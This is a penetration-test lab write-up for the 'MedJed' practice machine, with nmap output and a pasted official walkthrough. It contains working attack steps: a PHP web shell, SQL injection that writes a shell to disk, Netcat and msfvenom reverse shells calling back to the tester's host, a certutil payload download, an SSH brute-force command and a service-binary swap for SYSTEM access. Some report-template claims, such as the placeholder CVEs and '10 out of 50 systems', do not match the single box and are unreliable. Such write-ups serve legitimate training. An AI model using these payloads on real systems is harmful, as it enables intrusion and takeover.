# MedJed
## Table of Contents
* [Executive Summary](#executive-summary)
  * [Attack Vectors](#attack-vectors)
  * [Recommendations](#recommendations)
* [Methodology](#methodology)
  * [Reconnaissance](#reconnaissance)
  * [Enumeration](#enumeration)
  * [Gaining Access](#gaining-access)
  * [Maintaining Access](#maintaining-access)
  * [Covering Tracks](#covering-tracks)
* [Additional Items](#additional-items)

# Executive Summary
On 1 August 2021, Victor Fernandez III performed a penetration test of the Offensive Security exam network. This report includes detailed information about the vulnerabilities he discovered as well as recommendations for mitigating each of them. This report also contains an outline of the methodolgy he used to enumerate and exploit the THINC.local domain. During the penetration test, Victor was able to gain administrator-level access to multiple computers, primarly due to out-of-date and/or misconfigured software. A brief description of each computer compromised is listed below.

## Attack Vectors
| Vulnerabilities | Exploits |
| --- | ---| 
| CVE-2008-1234 | EDB-ID-56789 |
| CVE-2012-5678 | cyberphor POC |
| CVE-2021-9000 | Metasploit Module |

## Recommendations
Victor recommends patching the vulnerabilities he identified to mitigate the risk of exploitation and/or unauthorized access to Offensive Security information systems. One thing to remember is that these systems require frequent patching and once patched, should remain on a regular patch program to protect additional vulnerabilities that are discovered at a later date.

# Methodology
Victor used a widely-adopted and phased approach for the penetration test. This included reconnaissance, enumeration, gaining access, maintaining access, and covering his tracks. Below is an outline of Victor's activities and serves to demonstrate how he identified and exploited a variety of information systems across the Offensive Security exam network.

## Reconnaissance
The purpose of the reconnaissance phase of a penetration test is to identify information and sytems that represent the organization online and then, discover possible attack vectors. For this penetration test, Victor was asked to narrow his information gathering objectives to collecting the details below. 

### General Information
* Hostname: medjed 
* Description: 
* IP Address: 192.168.58.127
* MAC Address: (ref:) 
* Domain: WORKGROUP
* Distro: (ref:)
* Kernel: (ref:)
* Architecture: (ref:)

### Ports
```bash
# Nmap 7.91 scan initiated Wed Jul 21 07:54:26 2021 as: nmap -sS -sU -p- --min-rate 1000 -oN scans/medjed-nmap-complete 192.168.58.127
Nmap scan report for 192.168.58.127
Host is up (0.073s latency).
Not shown: 65535 open|filtered ports, 65518 filtered ports
PORT      STATE SERVICE
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
3306/tcp  open  mysql
5040/tcp  open  unknown
7680/tcp  open  pando-pub
30021/tcp open  ftp
33033/tcp open  http
44330/tcp open  https
45332/tcp open  http
45443/tcp open  http
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49668/tcp open  unknown
49669/tcp open  unknown

# Nmap done at Wed Jul 21 07:59:32 2021 -- 1 IP address (1 host up) scanned in 306.06 seconds
```

### Service Versions
```bash
# Nmap 7.91 scan initiated Wed Jul 21 08:15:07 2021 as: nmap -sV -sC -pT:135,139,445,3306,5040,7680,30021,33033,44330,45332,45443,49664,49665,49666,49667,49668,49669 -oN scans/medjed-nmap-versions 192.168.58.127
Nmap scan report for 192.168.58.127
Host is up (0.077s latency).

PORT      STATE SERVICE       VERSION
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
3306/tcp  open  mysql?
| fingerprint-strings: 
|   NULL: 
|_    Host '192.168.49.58' is not allowed to connect to this MariaDB server
5040/tcp  open  unknown
7680/tcp  open  pando-pub?
30021/tcp open  ftp           FileZilla ftpd 0.9.41 beta
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -r--r--r-- 1 ftp ftp            536 Nov 03  2020 .gitignore
| drwxr-xr-x 1 ftp ftp              0 Nov 03  2020 app
| drwxr-xr-x 1 ftp ftp              0 Nov 03  2020 bin
| drwxr-xr-x 1 ftp ftp              0 Nov 03  2020 config
| -r--r--r-- 1 ftp ftp            130 Nov 03  2020 config.ru
| drwxr-xr-x 1 ftp ftp              0 Nov 03  2020 db
| -r--r--r-- 1 ftp ftp           1750 Nov 03  2020 Gemfile
| drwxr-xr-x 1 ftp ftp              0 Nov 03  2020 lib
| drwxr-xr-x 1 ftp ftp              0 Nov 03  2020 log
| -r--r--r-- 1 ftp ftp             66 Nov 03  2020 package.json
| drwxr-xr-x 1 ftp ftp              0 Nov 03  2020 public
| -r--r--r-- 1 ftp ftp            227 Nov 03  2020 Rakefile
| -r--r--r-- 1 ftp ftp            374 Nov 03  2020 README.md
| drwxr-xr-x 1 ftp ftp              0 Nov 03  2020 test
| drwxr-xr-x 1 ftp ftp              0 Nov 03  2020 tmp
|_drwxr-xr-x 1 ftp ftp              0 Nov 03  2020 vendor
|_ftp-bounce: bounce working!
| ftp-syst: 
|_  SYST: UNIX emulated by FileZilla
33033/tcp open  unknown
| fingerprint-strings: 
|   GenericLines: 
|     HTTP/1.1 400 Bad Request
|   GetRequest, HTTPOptions: 
|     HTTP/1.0 403 Forbidden
|     Content-Type: text/html; charset=UTF-8
|     Content-Length: 3102
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset="utf-8" />
|     <title>Action Controller: Exception caught</title>
|     <style>
|     body {
|     background-color: #FAFAFA;
|     color: #333;
|     margin: 0px;
|     body, p, ol, ul, td {
|     font-family: helvetica, verdana, arial, sans-serif;
|     font-size: 13px;
|     line-height: 18px;
|     font-size: 11px;
|     white-space: pre-wrap;
|     pre.box {
|     border: 1px solid #EEE;
|     padding: 10px;
|     margin: 0px;
|     width: 958px;
|     header {
|     color: #F0F0F0;
|     background: #C52F24;
|     padding: 0.5em 1.5em;
|     margin: 0.2em 0;
|     line-height: 1.1em;
|     font-size: 2em;
|     color: #C52F24;
|     line-height: 25px;
|     .details {
|_    bord
44330/tcp open  ssl/unknown
| ssl-cert: Subject: commonName=server demo 1024 bits/organizationName=Real Time Logic/stateOrProvinceName=CA/countryName=US
| Not valid before: 2009-08-27T14:40:47
|_Not valid after:  2019-08-25T14:40:47
|_ssl-date: 2021-07-21T12:18:30+00:00; 0s from scanner time.
45332/tcp open  http          Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1g PHP/7.3.23)
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1g PHP/7.3.23
|_http-title: Quiz App
45443/tcp open  http          Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1g PHP/7.3.23)
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1g PHP/7.3.23
|_http-title: Quiz App
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port3306-TCP:V=7.91%I=7%D=7/21%Time=60F80FCE%P=x86_64-pc-linux-gnu%r(NU
SF:LL,4C,"H\0\0\x01\xffj\x04Host\x20'192\.168\.49\.58'\x20is\x20not\x20all
SF:owed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port33033-TCP:V=7.91%I=7%D=7/21%Time=60F80FD4%P=x86_64-pc-linux-gnu%r(G
SF:enericLines,1C,"HTTP/1\.1\x20400\x20Bad\x20Request\r\n\r\n")%r(GetReque
SF:st,C76,"HTTP/1\.0\x20403\x20Forbidden\r\nContent-Type:\x20text/html;\x2
SF:0charset=UTF-8\r\nContent-Length:\x203102\r\n\r\n<!DOCTYPE\x20html>\n<h
SF:tml\x20lang=\"en\">\n<head>\n\x20\x20<meta\x20charset=\"utf-8\"\x20/>\n
SF:\x20\x20<title>Action\x20Controller:\x20Exception\x20caught</title>\n\x
SF:20\x20<style>\n\x20\x20\x20\x20body\x20{\n\x20\x20\x20\x20\x20\x20backg
SF:round-color:\x20#FAFAFA;\n\x20\x20\x20\x20\x20\x20color:\x20#333;\n\x20
SF:\x20\x20\x20\x20\x20margin:\x200px;\n\x20\x20\x20\x20}\n\n\x20\x20\x20\
SF:x20body,\x20p,\x20ol,\x20ul,\x20td\x20{\n\x20\x20\x20\x20\x20\x20font-f
SF:amily:\x20helvetica,\x20verdana,\x20arial,\x20sans-serif;\n\x20\x20\x20
SF:\x20\x20\x20font-size:\x20\x20\x2013px;\n\x20\x20\x20\x20\x20\x20line-h
SF:eight:\x2018px;\n\x20\x20\x20\x20}\n\n\x20\x20\x20\x20pre\x20{\n\x20\x2
SF:0\x20\x20\x20\x20font-size:\x2011px;\n\x20\x20\x20\x20\x20\x20white-spa
SF:ce:\x20pre-wrap;\n\x20\x20\x20\x20}\n\n\x20\x20\x20\x20pre\.box\x20{\n\
SF:x20\x20\x20\x20\x20\x20border:\x201px\x20solid\x20#EEE;\n\x20\x20\x20\x
SF:20\x20\x20padding:\x2010px;\n\x20\x20\x20\x20\x20\x20margin:\x200px;\n\
SF:x20\x20\x20\x20\x20\x20width:\x20958px;\n\x20\x20\x20\x20}\n\n\x20\x20\
SF:x20\x20header\x20{\n\x20\x20\x20\x20\x20\x20color:\x20#F0F0F0;\n\x20\x2
SF:0\x20\x20\x20\x20background:\x20#C52F24;\n\x20\x20\x20\x20\x20\x20paddi
SF:ng:\x200\.5em\x201\.5em;\n\x20\x20\x20\x20}\n\n\x20\x20\x20\x20h1\x20{\
SF:n\x20\x20\x20\x20\x20\x20margin:\x200\.2em\x200;\n\x20\x20\x20\x20\x20\
SF:x20line-height:\x201\.1em;\n\x20\x20\x20\x20\x20\x20font-size:\x202em;\
SF:n\x20\x20\x20\x20}\n\n\x20\x20\x20\x20h2\x20{\n\x20\x20\x20\x20\x20\x20
SF:color:\x20#C52F24;\n\x20\x20\x20\x20\x20\x20line-height:\x2025px;\n\x20
SF:\x20\x20\x20}\n\n\x20\x20\x20\x20\.details\x20{\n\x20\x20\x20\x20\x20\x
SF:20bord")%r(HTTPOptions,C76,"HTTP/1\.0\x20403\x20Forbidden\r\nContent-Ty
SF:pe:\x20text/html;\x20charset=UTF-8\r\nContent-Length:\x203102\r\n\r\n<!
SF:DOCTYPE\x20html>\n<html\x20lang=\"en\">\n<head>\n\x20\x20<meta\x20chars
SF:et=\"utf-8\"\x20/>\n\x20\x20<title>Action\x20Controller:\x20Exception\x
SF:20caught</title>\n\x20\x20<style>\n\x20\x20\x20\x20body\x20{\n\x20\x20\
SF:x20\x20\x20\x20background-color:\x20#FAFAFA;\n\x20\x20\x20\x20\x20\x20c
SF:olor:\x20#333;\n\x20\x20\x20\x20\x20\x20margin:\x200px;\n\x20\x20\x20\x
SF:20}\n\n\x20\x20\x20\x20body,\x20p,\x20ol,\x20ul,\x20td\x20{\n\x20\x20\x
SF:20\x20\x20\x20font-family:\x20helvetica,\x20verdana,\x20arial,\x20sans-
SF:serif;\n\x20\x20\x20\x20\x20\x20font-size:\x20\x20\x2013px;\n\x20\x20\x
SF:20\x20\x20\x20line-height:\x2018px;\n\x20\x20\x20\x20}\n\n\x20\x20\x20\
SF:x20pre\x20{\n\x20\x20\x20\x20\x20\x20font-size:\x2011px;\n\x20\x20\x20\
SF:x20\x20\x20white-space:\x20pre-wrap;\n\x20\x20\x20\x20}\n\n\x20\x20\x20
SF:\x20pre\.box\x20{\n\x20\x20\x20\x20\x20\x20border:\x201px\x20solid\x20#
SF:EEE;\n\x20\x20\x20\x20\x20\x20padding:\x2010px;\n\x20\x20\x20\x20\x20\x
SF:20margin:\x200px;\n\x20\x20\x20\x20\x20\x20width:\x20958px;\n\x20\x20\x
SF:20\x20}\n\n\x20\x20\x20\x20header\x20{\n\x20\x20\x20\x20\x20\x20color:\
SF:x20#F0F0F0;\n\x20\x20\x20\x20\x20\x20background:\x20#C52F24;\n\x20\x20\
SF:x20\x20\x20\x20padding:\x200\.5em\x201\.5em;\n\x20\x20\x20\x20}\n\n\x20
SF:\x20\x20\x20h1\x20{\n\x20\x20\x20\x20\x20\x20margin:\x200\.2em\x200;\n\
SF:x20\x20\x20\x20\x20\x20line-height:\x201\.1em;\n\x20\x20\x20\x20\x20\x2
SF:0font-size:\x202em;\n\x20\x20\x20\x20}\n\n\x20\x20\x20\x20h2\x20{\n\x20
SF:\x20\x20\x20\x20\x20color:\x20#C52F24;\n\x20\x20\x20\x20\x20\x20line-he
SF:ight:\x2025px;\n\x20\x20\x20\x20}\n\n\x20\x20\x20\x20\.details\x20{\n\x
SF:20\x20\x20\x20\x20\x20bord");
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-07-21T12:17:50
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Jul 21 08:18:32 2021 -- 1 IP address (1 host up) scanned in 204.96 seconds
```

### Operating System
```bash
# Nmap 7.91 scan initiated Thu Jul 22 21:01:37 2021 as: nmap -O -oN scans/medjed-nmap-os 192.168.58.127
Nmap scan report for 192.168.58.127
Host is up (0.10s latency).
Not shown: 996 filtered ports
PORT     STATE SERVICE
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
3306/tcp open  mysql
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows XP|7 (89%)
OS CPE: cpe:/o:microsoft:windows_xp::sp3 cpe:/o:microsoft:windows_7
Aggressive OS guesses: Microsoft Windows XP SP3 (89%), Microsoft Windows XP SP2 (86%), Microsoft Windows 7 (85%)
No exact OS matches for host (test conditions non-ideal).

OS detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Jul 22 21:05:15 2021 -- 1 IP address (1 host up) scanned in 218.34 seconds
```

## Enumeration
The service enumeration portion of a penetration test focuses on gathering information about what services are alive on a system or systems. This is valuable for an attacker as it provides detailed information on potential attack vectors into a system. Understanding what applications are running on the system gives an attacker needed information before performing the actual penetration test. In some cases, some ports may not be listed.

### FTP
```bash
cd loot
touch README.too # create a file
ftp $TARGET 21 # login using anonymous:anonymous
put README.too # upload file created above (i.e. check if we have write privileges)
ls
binary 
get file.txt # download a file (i.e. check if we have read privileges)
mget * # download everything
exit
```

### SSH
```bash
hydra -l root -P /usr/share/wordlists/rockyou.txt  ssh://10.11.12.13
```

### SMTP
Automated enumeration of supported SMTP commands.
```bash
sudo nmap $TARGET -p25 --script smtp-commands -oN scans/$NAME-nmap-scripts-smtp-commands
# replace the lines above with the actual scan results
```

Automated enumeration of existing SMTP users.
```bash
sudo nmap $TARGET -p25 --script smtp-enum-users --script-args smtp-enum-users.methods={VRFY,EXPN,RCPT} -oN scans/$NAME-nmap-scripts-smtp-enum-users
# replace the lines above with the actual scan results
```
```bash
smtp-user-enum -M VRFY -U /usr/share/wordlists/metasploit/unix_users.txt -t $TARGET
```

Automated enumeration of exploitable SMTP vulnerabilities.
```bash
sudo nmap $TARGET -p25 --script smtp-vuln* -oN scans/mailman-nmap-scripts-smtp-vuln
# replace the lines above with the actual scan results
```

### HTTP
The target is NOT vulnerable to Shellshock.
```bash
sudo nmap $TARGET -p80 --script http-shellshock -oN scans/$NAME-nmap-scripts-http-shellshock-80
# replace the lines above with the actual scan results
```

Victor was able to discover the hidden directories below using Dirb.
```bash
dirb http://$TARGET:80 /usr/share/wordlists/dirb/big.txt -z10 -o scans/$NAME-dirb-big-80

# output
NSTR
```

Victor was able to discover the hidden directories below using Dirsearch.
```bash
dirsearch -u $TARGET:$PORT -o $FULLPATH/$NAME-dirsearch-80
# replace the lines above with the actual scan results
```

Victor was able to identify the following HTTP server misconfigurations using Nikto.
```bash
nikto -h $TARGET -p $PORT -T 2 -Format txt -o scans/$NAME-nikto-misconfig-80

# output
NSTR
```

### RPC
```bash
rpcclient -U '' $TARGET

# output
Enter WORKGROUP\'s password: 
Cannot connect to server.  Error was NT_STATUS_LOGON_FAILURE
```

### NetBIOS
```bash
nbtscan $TARGET

# output
Doing NBT name scan for addresses from 192.168.58.127

IP address       NetBIOS Name     Server    User             MAC address      
------------------------------------------------------------------------------
```

### SMB
The following SMB shares were discovered using Smbclient.
```bash
smbclient -L $TARGET

# output
Enter WORKGROUP\victor's password: 
session setup failed: NT_STATUS_ACCESS_DENIED
```

## Gaining Access
The penetration testing portions of the assessment focus heavily on gaining access to a variety of systems. During this penetration test, Victor was able to successfully gain access to 10 out of the 50 systems.

```bash
firefox http://192.168.58.127:44330
```

After accessing TCP port 44330 in the browser, I was prompted to set the admin password (as an anonymous user) for the BarracudaDrive CMS application. This allowed me to access the local file system, upload a PHP command shell, upload Netcat, and then execute both. I used the TCP port 45443 (the Quiz app) as inspiration for my LPORT. 

```php
cat cmd.php

# output
<?php echo shell_exec($_GET['cmd']);?>
```

```bash
cmd.php?cmd=powershell.exe -c "c:\xampp\htdocs\nc.exe 192.168.49.58 45443 -e 'cmd.exe'"
```

## Maintaining Access
Maintaining access to a system is important to us as attackers, ensuring that we can get back into a system after it has been exploited is invaluable. The maintaining access phase of the penetration test focuses on ensuring that once the focused attack has occurred (i.e. a buffer overflow), we have administrative access over the system again. Many exploits may only be exploitable once and we may never be able to get back into a system after we have already per-formed the exploit. Victor added administrator and root level accounts on all systems compromised. In addition to the administrative/root access, a Metasploit meterpreter service was installed on the machine to en-sure that additional access could be established.

### Privilege Escalation

#### EDB-ID-48789
```bash
# i used TCP port 44330 (the BarracudaDrive app) as inspiration for my LPORT.
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.49.58 LPORT=44330 -f exe -o bd.exe

# i used TCP port 33033 (the UserPro app) as inspiration for my LPORT.
sudo python3 -m http.server 33033
```

```bash
# target side, as Jerren, via the nc.exe exploit (that was provided via cmd.php). 
cd C:\bd
mv bd.exe bdsm.exe
powershell
iwr http://192.168.49.58:33033/bd.exe -outfile bd.exe
# then replace the Python web server on the attacker side with sudo nc -nvlp 33033
shutdown /r /t 0
```

```bash
sudo nc -nvlp 33033
whoami

# output
nt authority\system
```

## Covering Tracks
The house cleaning portions of the assessment ensures that remnants of the penetration test are removed. Often fragments of tools or user accounts are left on an organizations computer which can cause security issues down the road. Ensuring that we are meticulous and no remnants of our penetration test are left over is important. After the trophies on both the lab network and exam network were completed, Victor removed all user accounts and passwords as well as the Meterpreter services installed on the system. Offensive Security should not have to remove any user accounts or services from the system.

# Additional Items
## Tools Used
* nmap
* nc
* cmd.php
* msfvenom

## Hints
* Scan all TCP ports in detail. Find and enumerate two web applications. Be sure to locate the webroot for one of them.
* Use guesswork or brute-force to gain web app access. Find and exploit an SQLi. Combine SQLi with what you found earlier to get a shell.
* Enumerate what software is installed on the system. You can find the software version in a common file. There is an easy exploit for it. 

## Flags
* local.txt = 38c49c844eaa288141555d5d27939fa7
* proof.txt = be2e1861ad1996497a80743bf346af17

## Lessons Learned
* If you get the error below, change the LPORT variable of your exploit. For example, try using a port you discovered was open during the reconnaissance phase. 
```
/*
Warning: fread() expects parameter 1 to be resource, bool given in C:\xampp\htdocs\rshell.php on line 74

Warning: fclose() expects parameter 1 to be resource, bool given in C:\xampp\htdocs\rshell.php on line 89
```
* To upgrade your shell to a fully-functional PTY on Windows, try using nc.exe instead of a Msfvenom reverse shell. 

## Official Walkthrough
```bash


If we navigate to Forgot Password (http://192.168.120.132:33033/users/reminder), we are presented with three fields: the Username field, the Reminder field that accepts a word or a sentence, and the New Password field that lets us reset our password. Since we have access to the users’ usernames and email addresses, we must only bypass the reminder field, which seems to act as a verification mechanism.
Exploitation
Resetting Application User Password

Based on our previous findings, we’ll enter Only the paranoid survive in the reminder field. Unfortunately, that doesn’t seem to work. Applying some guesswork and various attempts, we try inputting paranoid in the reminder field, entering the following data into the form:

Username: jerren.devops
Reminder: paranoid
New Password: password123

After clicking the Update button, we are presented with Password was successfully updated, and we are redirected back to the login page. We can now log in as jerren.devops:password123.
SQL Injection

Now that we are logged in, we can edit the user’s profile by clicking Edit in the bottom-left. We are then redirected to the profile edit page (http://192.168.120.132:33033/users/4/edit), at the bottom of which we find Request Profile SLUG (experimental):

Clicking on that link takes us to the /slug endpoint (http://192.168.120.132:33033/slug) where we are met with a single field that seems to be accepting a URL string to send a profile request to. Above the field at the top of the form, we find #<Mysql2::Result:0x000...>. This is quite odd in this context.

Since the string mentions a database (Mysql2), let’s try a quick test for the presence of an SQL injection vulnerability by inputting one single quote (') into the field and clicking the Request button. The page blows up with a red SQL error message, which tells us that we have indeed discovered an SQLi vulnerability:

The vulnerable query is revealed in the verbose error message. This is a textbook example of a vulnerable SQL query string.

sql = "SELECT username FROM users WHERE username = '" + params[:URL].to_s + "'"

Remote Code Execution

Recalling the web server on port 45332, we found the document root directory of the website (from the phpinfo() output) to be C://xampp//htdocs//. Leveraging the SQLi vulnerability, we should be able to write a PHP web shell to that directory.

Here’s our UNION injection query:

' UNION SELECT ("<?php echo passthru($_GET['cmd']);") INTO OUTFILE 'C:/xampp/htdocs/cmd.php'  -- -'

When we submit the form, the URL changes to the following:

http://192.168.120.132:33033/slug?URL=%27+UNION+SELECT+%28%22%3C%3Fphp+echo+passthru%28%24_GET%5B%27cmd%27%5D%29%3B%22%29+INTO+OUTFILE+%27C%3A%2Fxampp%2Fhtdocs%2Fcmd.php%27++--+-%27

This is promising, and hopefully our injection was successful. We can verify this by passing a Windows command into the cmd parameter:

kali@kali:~$ curl "http://192.168.120.132:45332/cmd.php?cmd=dir"
 Volume in drive C has no label.
 Volume Serial Number is A41E-B108

 Directory of C:\xampp\htdocs

11/09/2020  08:46 AM    <DIR>          .
11/09/2020  08:46 AM    <DIR>          ..
11/09/2020  08:46 AM                35 cmd.php
11/03/2020  11:13 AM               887 index.html
11/03/2020  11:16 AM                21 phpinfo.php
11/03/2020  11:13 AM             3,023 script.js
11/03/2020  11:14 AM             1,266 styles.css
               5 File(s)          5,232 bytes
               2 Dir(s)   1,602,994,176 bytes free

Nice. We have remote code execution on the target.
Getting a Shell

After some testing, we discover that our attack machine can only be reached on certain ports. We will be using port 30021 for our reverse shell and port 45332 for a web server to host our payload.

Let’s use Metasploit to create our reverse shell payload.

kali@kali:~$ msfvenom -p windows/shell_reverse_tcp LHOST=192.168.118.8 LPORT=30021 -f exe -o reverse.exe      
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 324 bytes
Final size of exe file: 73802 bytes
Saved as: reverse.exe

We’ll start a python web server listening on port 45332.

kali@kali:~$ python3 -m http.server 45332                
Serving HTTP on 0.0.0.0 port 45332 (http://0.0.0.0:45332/) ...

Next, we can use our web shell to download the payload to the target with certutil. Note that we need to URL-encode our command.

kali@kali:~$ curl "http://192.168.120.132:45332/cmd.php?cmd=certutil+-f+-urlcache+http://192.168.118.8:45332/reverse.exe+reverse.exe"
****  Online  ****
CertUtil: -URLCache command completed successfully.

Let’s start a Netcat listener on port 30021.

kali@kali:~$ nc -lvnp 30021
listening on [any] 30021 ...

Finally, we will use the web shell to execute our payload.

kali@kali:~$ curl "http://192.168.120.132:45332/cmd.php?cmd=reverse.exe"
...

The Netcat output indicates that we have received our reverse shell:

kali@kali:~$ nc -lvnp 30021
listening on [any] 30021 ...
connect to [192.168.118.8] from (UNKNOWN) [192.168.120.132] 49946
Microsoft Windows [Version 10.0.18363.1139]
(c) 2019 Microsoft Corporation. All rights reserved.

C:\xampp\htdocs>whoami
whoami
medjed\jerren

Escalation
Local Enumeration

While enumerating the C:\ drive, we find an interesting folder: C:\bd.

C:\xampp\htdocs>cd C:\
cd C:\

C:\>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is A41E-B108

 Directory of C:\

01/21/2021  05:48 AM    <DIR>          bd
11/03/2020  10:46 AM    <DIR>          FTP
10/16/2020  12:49 PM    <DIR>          PerfLogs
...

Let’s list its contents.

C:\>cd bd
cd bd

C:\bd>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is A41E-B108

 Directory of C:\bd

01/21/2021  05:48 AM    <DIR>          .
01/21/2021  05:48 AM    <DIR>          ..
11/03/2020  09:29 AM    <DIR>          applications
11/03/2020  09:29 AM                38 bd.conf
11/03/2020  09:29 AM               259 bd.dat
04/26/2013  02:55 PM         1,661,648 bd.exe
06/12/2011  01:49 PM               207 bd.lua
04/26/2013  02:55 PM           912,033 bd.zip
06/14/2012  09:21 AM            33,504 bdctl.exe
11/03/2020  09:29 AM    <DIR>          cache
11/03/2020  09:29 AM    <DIR>          cmsdocs
11/03/2020  09:29 AM    <DIR>          data
12/03/2010  01:52 PM             5,139 install.txt
10/26/2010  01:38 PM           421,200 msvcp100.dll
10/26/2010  01:38 PM           770,384 msvcr100.dll
02/18/2013  07:39 PM           240,219 non-commercial-license.rtf
01/21/2021  05:48 AM                 6 pidfile
04/26/2013  02:50 PM            16,740 readme.txt
11/03/2020  09:29 AM               702 roles.dat
06/14/2012  09:21 AM           383,856 sqlite3.exe
11/03/2020  09:29 AM    <DIR>          themes
01/21/2021  05:48 AM    <DIR>          trace
11/03/2020  09:29 AM           133,107 Uninstall.exe
              15 File(s)      4,579,042 bytes
               8 Dir(s)   2,130,604,032 bytes free

The contents of readme.txt reveal very useful information:

C:\bd>type readme.txt
type readme.txt
 Changes for 6.5   May 2013
 ...
 The following Web File Manager problems are now fixed:
   * The image pre-view could cause BarracudaDrive to consume too much
     memory on low memory devices such as the Raspberry Pi.
 ...

We find that bd refers to BarracudaDrive, of which the version 6.5 is running.
BarracudaDrive v6.5 - Insecure Folder Permissions

After an exploit search, we discover an Insecure Folder Permissions vulnerability. Let’s try to verify this.

C:\bd>icacls C:\bd
icacls C:\bd
C:\bd BUILTIN\Administrators:(I)(OI)(CI)(F)
      NT AUTHORITY\SYSTEM:(I)(OI)(CI)(F)
      BUILTIN\Users:(I)(OI)(CI)(RX)
      NT AUTHORITY\Authenticated Users:(I)(M)
      NT AUTHORITY\Authenticated Users:(I)(OI)(CI)(IO)(M)

Successfully processed 1 files; Failed processing 0 files

C:\bd>icacls C:\bd\bd.exe
icacls C:\bd\bd.exe
C:\bd\bd.exe BUILTIN\Administrators:(I)(F)
             NT AUTHORITY\SYSTEM:(I)(F)
             BUILTIN\Users:(I)(RX)
             NT AUTHORITY\Authenticated Users:(I)(M)

Successfully processed 1 files; Failed processing 0 files

C:\bd>

We’ll reuse our reverse shell payload file (reverse.exe) and save it as bd.exe. First, we’ll back up the original binary:

C:\bd>move bd.exe bd.exe.bak
move bd.exe bd.exe.bak
        1 file(s) moved.

We can now safely copy our reverse shell as C:\bd\bd.exe.

C:\bd>copy C:\xampp\htdocs\reverse.exe bd.exe
copy C:\xampp\htdocs\reverse.exe bd.exe
        1 file(s) copied.

Let’s restart our Netcat listener on the same port.

kali@kali:~$ nc -lvnp 30021                        
listening on [any] 30021 ...

Now all we have to do is reboot the target machine:

C:\bd> shutdown /r 
C:\bd>

kali@kali:~$

After the reboot, our malicious copy of bd.exe is executed, and we are presented with a full system shell:

kali@kali:~$ nc -lvnp 30021                        
listening on [any] 30021 ...
connect to [192.168.118.8] from (UNKNOWN) [192.168.120.132] 49669
Microsoft Windows [Version 10.0.18363.1139]
(c) 2019 Microsoft Corporation. All rights reserved.

C:\Windows\system32> C:\Windows\system32>whoami
whoami
nt authority\system
```
